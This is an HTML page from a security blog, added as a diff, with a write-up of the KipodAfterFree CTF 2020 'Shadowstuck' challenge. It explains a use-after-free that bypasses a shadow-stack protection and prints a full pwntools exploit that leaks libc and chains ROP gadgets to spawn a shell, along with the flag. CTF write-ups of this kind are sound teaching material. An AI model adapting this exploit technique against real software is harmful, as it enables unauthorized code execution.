@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Write Up : KipodAfterFree CTF 2020 - Shadowstuck &middot; 0xUKN - (in)Security Blog </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.68.3" />
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://0xukn.fr/css/nix.css">
+
+
+
+<link rel="shortcut icon" href="/favicon.jpg">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://0xukn.fr>0xUKN@localhost ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/">about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/posts">posts</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/projects">projects</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/tags">tags</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://0xukn.fr/posts/writeupkipodafterfreectf2020shadowstuck/">Write Up : KipodAfterFree CTF 2020 - Shadowstuck</a></h1>
+	
+		<br><br>
+		<div id="tags">
+			<h4 style="display:inline">Tags :</h4>
+			
+				
+				<a href="/tags/pwn">pwn</a>
+			
+				 - 
+				<a href="/tags/use-after-free">use-after-free</a>
+			
+				 - 
+				<a href="/tags/linux-exploitation">Linux exploitation</a>
+			
+				 - 
+				<a href="/tags/stack-overflow">stack overflow</a>
+			
+		</div>
+	
+            <span class="post-date">2020-11-09 </span>
+            <div class="post-content">
+                <p><em><strong>This post spoils a CTF challenge &hellip; Don&rsquo;t read if you want to try it !</strong></em></p>
+<p>KipodAfterFree CTF is a Jeopardy-style information security competition hosted by KipodAfterFree CTF team. I registered late, so I only had time to do 2 challenges before the end of the CTF. Btw,the challenges were really interesting and will be left online until the end of November if you want to try them out.</p>
+<h2 id="-presentation"><em>[+]</em> Presentation</h2>
+<p>Ever since PITA™ declared the usage of stack canaries inhumane, we&rsquo;ve been working on bringing you the latest and greatest in animal-abuse-free stack protector technology. Can you crack it?</p>
+<p>nc challenges.ctf.kaf.sh 8000</p>
+<p><a href="/resources/kaf2020_shadowstuck/shadowstuck">shadowstuck</a></p>
+<p><a href="/resources/kaf2020_shadowstuck/libc-2.31.so">libc-2.31.so</a></p>
+<h2 id="-recon"><em>[+]</em> Recon</h2>
+<p>The binary is not stripped, and has all protections activated except stack canary.</p>
+<p><code>shadowstuck: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7eadce03ae009b82a96d080ad404fb11c3765403, for GNU/Linux 3.2.0, not stripped</code></p>
+<pre><code>[*] './shadowstuck'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+</code></pre><p>In fact, this binary is using a shadowstack as stack protector technology. The concept is the following :</p>
+<ul>
+<li>when the program starts, it maps a memory region for its shadowstack</li>
+<li>when a function is called, its return address is pushed into the shadowstack</li>
+<li>before a function returns, its return address is compared to its copy on the shadowstack : if they are different, the binary exits with a warning message</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ss_init</span>(<span style="color:#66d9ef">void</span>)
+{
+  <span style="color:#66d9ef">int</span> iVar1;
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvVar2;
+  uint <span style="color:#f92672">*</span>puVar3;
+  
+  pvVar2 <span style="color:#f92672">=</span> mmap((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x3000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">if</span> (pvVar2 <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+    fwrite(<span style="color:#e6db74">&#34;Could not create shadowstack pages</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x23</span>,stderr);
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+    _exit(<span style="color:#ae81ff">1</span>);
+  }
+  iVar1 <span style="color:#f92672">=</span> mprotect((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)pvVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>),<span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">3</span>);
+  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+    puVar3 <span style="color:#f92672">=</span> (uint <span style="color:#f92672">*</span>)__errno_location();
+    fprintf(stderr,<span style="color:#e6db74">&#34;Could not set RW protections on shadowstack page, errno: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)<span style="color:#f92672">*</span>puVar3);
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+    _exit(<span style="color:#ae81ff">1</span>);
+  }
+  printf(<span style="color:#e6db74">&#34;Shadow stack set up at %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(<span style="color:#66d9ef">long</span>)pvVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>);
+  SHADOW_STACK <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)pvVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>;
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>The hooks at the beginning and at the end of every functions are supported by the GCC option <code>-finstrument-functions</code> and the following functions :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__cyg_profile_func_enter</span>(undefined8 param_1,undefined8 param_2)
+{
+  <span style="color:#f92672">*</span>SHADOW_STACK <span style="color:#f92672">=</span> param_2;
+  SHADOW_STACK <span style="color:#f92672">=</span> SHADOW_STACK <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+  <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__cyg_profile_func_exit</span>(undefined8 param_1,<span style="color:#66d9ef">long</span> param_2)
+{
+  SHADOW_STACK <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)SHADOW_STACK <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>);
+  <span style="color:#66d9ef">if</span> (param_2 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>SHADOW_STACK) {
+    puts(<span style="color:#e6db74">&#34;Return address tampering detected, exiting.&#34;</span>);
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+    _exit(<span style="color:#ae81ff">1</span>);
+  }
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>Otherwise, the binary looks like a classic heap challenge : it is an employee management application, which allows you to add employees, modify employees&rsquo;s name, fire employees and read employees list.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/kaf2020_shadowstuck/main.png"  />
+    
+    
+</figure>
+</p>
+<p>However, the binary has 2 special &ldquo;features&rdquo; :</p>
+<ul>
+<li>
+<p>when the binary starts, we have a shadowstack leak (the shadowstack&rsquo;s base address is given) :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/kaf2020_shadowstuck/leak.png"  />
+    
+    
+</figure>
+</p>
+</li>
+<li>
+<p>when the binary exits we have a straighforward stack overflow :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/kaf2020_shadowstuck/overflow.png"  />
+    
+    
+</figure>
+</p>
+</li>
+</ul>
+<h2 id="-exploitation"><em>[+]</em> Exploitation</h2>
+<p>Basically, we can&rsquo;t directly exploit the stack overflow because of two things :</p>
+<ul>
+<li>we are lacking a libc/pie leak (to redirect the program to system for example)</li>
+<li>the shadowstack mitigation prevents us from overwriting RIP save on stack and taking over the program execution flow</li>
+</ul>
+<p>So we need to find a way to leak the libc base address, and bypass (overwrite ?) the shadowstack = we need an arbitrary read and an arbitrary write.</p>
+<p>After reversing the binary, we can see that the <code>employee</code> structure is a linked list whose value is the employee name (16 bytes) :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">struct</span> employee
+{
+    <span style="color:#66d9ef">char</span> employee_name[<span style="color:#ae81ff">0x10</span>];
+    employee <span style="color:#f92672">*</span> next_employee;
+};
+</code></pre></div><p>The vulnerability is in the  <code>manager_remove</code> function (which is used when firing an employee, to free its structure and remove him from the linked list) :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">exit:
+  __cyg_profile_func_exit(manager_remove,local_res0);
+  <span style="color:#66d9ef">return</span> retval;
+LAB_00101b01:
+  <span style="color:#66d9ef">if</span> (temp_list_root2<span style="color:#f92672">-&gt;</span>next_employee <span style="color:#f92672">==</span> (employee <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> LAB_00101b0e;
+  <span style="color:#66d9ef">if</span> (temp_list_root1 <span style="color:#f92672">==</span> temp_list_root2<span style="color:#f92672">-&gt;</span>next_employee) {
+    temp_list_root2<span style="color:#f92672">-&gt;</span>next_employee <span style="color:#f92672">=</span> temp_list_root1<span style="color:#f92672">-&gt;</span>next_employee;
+    <span style="color:#66d9ef">goto</span> LAB_00101b0e;
+  }
+  temp_list_root2 <span style="color:#f92672">=</span> temp_list_root2<span style="color:#f92672">-&gt;</span>next_employee;
+  <span style="color:#66d9ef">goto</span> LAB_00101b01;
+LAB_00101b0e:
+  free(temp_list_root1);
+  retval <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">goto</span> exit;
+</code></pre></div><p>When the employee is not at the end of the linked list, there is no problem : the structure is safely freed, and the previous <code>next</code> pointer is overwritten with the next employee&rsquo;s structure address.
+But if the employee is at the end of the linked list (the last employee), the structure is freed but the previous <code>next</code> pointer is not overwritten : we have a use-after-free situation.</p>
+<p>The interesting thing is that this use-after-free always occurs when firing the last employee, just before the program asks us to provide an 0x18 bytes length message as a firing reason.
+Since 0x18 is the exact length of an employee structure, the message&rsquo;s buffer will be allocated on our previously freed employee structure, effectively overwriting the employee&rsquo;s name and the <code>next</code> pointer.</p>
+<p>We can use this use-after-free to read and write arbitrary memory : let&rsquo;s say there are n employees in the linked list, the idea is to fire the nth employee to trigger the UAF, overwrite the <code>next</code> pointer with an address we want to read or write, and then access the fake n+1 employee through the <code>manager_read</code> function (for arbitrary read) or <code>manager_rename</code> function (for arbitrary write).</p>
+<p>By setting the <code>next</code> pointer to the address where main&rsquo;s return address is stored in shadowstack, we can at the same time leak a libc address (since main returns to __libc_start_main) and bypass the shadowstack by overwriting main&rsquo;s return address with the first gadget of our future ROP, which will be written in place of  the real main&rsquo;s return address.</p>
+<p>We can then just ROP our way to system, using the stack overflow triggered when exiting the application.</p>
+<p>Here&rsquo;s the final <a href="/resources/kaf2020_shadowstuck/solve.py">exploit</a> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> process, remote, ELF, context, pack, unpack, gdb
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+context<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">employee_exit</span>(reason):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Q&#34;</span>)
+    p<span style="color:#f92672">.</span>recvline()
+    p<span style="color:#f92672">.</span>sendline(reason)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_employee</span>(employee_num):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;R&#34;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> employee_num)
+    a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Could not&#39;</span> <span style="color:#f92672">in</span> a:
+        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not find employee&#34;</span>)
+    employee_name <span style="color:#f92672">=</span> a<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>][:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    <span style="color:#66d9ef">return</span> employee_name
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fire_employee</span>(employee_name, reason):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;F&#34;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(employee_name)
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Could not&#39;</span> <span style="color:#f92672">in</span> p<span style="color:#f92672">.</span>recvline():
+        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not find employee&#34;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(reason)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_employee</span>(employee_name):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(employee_name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change_employee</span>(employee_num, employee_new_name):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> employee_num)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(employee_new_name)
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.ctf.kaf.sh&#34;</span>, <span style="color:#ae81ff">8000</span>)
+<span style="color:#75715e">#p = process(&#39;./shadowstuck&#39;, env={&#34;LD_PRELOAD&#34;:&#34;./libc-2.31.so&#34;})</span>
+
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>)
+
+base_shadowstack <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;at &#39;</span>)[<span style="color:#ae81ff">1</span>][:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Shadowstack @ 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> base_shadowstack)
+
+add_employee(<span style="color:#e6db74">&#34;Mike&#34;</span>) <span style="color:#75715e">#0</span>
+
+fire_employee(<span style="color:#e6db74">&#34;Mike&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> pack(base_shadowstack)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>])
+leak <span style="color:#f92672">=</span> unpack(read_employee(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Leak libc @ 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> leak)
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">159923</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Libc @ 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> libc<span style="color:#f92672">.</span>address)
+
+pop_rdi_gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x26b72</span>
+
+change_employee(<span style="color:#ae81ff">1</span>, pack(pop_rdi_gadget)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+<span style="color:#66d9ef">assert</span> unpack(read_employee(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">==</span> pop_rdi_gadget
+
+rop <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span> <span style="color:#75715e">#padding</span>
+rop <span style="color:#f92672">+=</span> pack(pop_rdi_gadget)
+rop <span style="color:#f92672">+=</span> pack(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)))
+rop <span style="color:#f92672">+=</span> pack(pop_rdi_gadget <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#75715e">#for stack alignment</span>
+rop <span style="color:#f92672">+=</span> pack(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>])
+
+employee_exit(rop)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Flag : KAF{1_SUR3_H0P3_C3T_1S_B3TTER_WR1TTEN}</p>
+<h2 id="-bye"><em>[+]</em> Bye</h2>
+<p><strong>Feel free to tell me what you think about this post :)</strong></p>
+
+            </div>
+            
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>2020 - 0xUKN -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and based on
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+    </body>
